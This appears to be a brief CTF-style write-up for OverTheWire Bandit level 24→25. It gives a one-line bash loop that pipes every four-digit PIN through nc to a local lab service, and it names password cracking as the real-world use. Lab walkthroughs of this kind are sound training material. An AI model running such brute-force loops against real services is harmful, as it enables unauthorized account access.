# Bandit Level 24 → 25

## Goal
Brute-force PIN to get password

## Approach
Try all possible combinations.

## Commands Used
for i in {0000..9999}; do echo "password $i"; done | nc localhost 30002

## Explanation
Brute-force all PIN combinations to retrieve the correct one.

## Key Learning
Brute-force techniques.

## Real World Use
Password cracking.
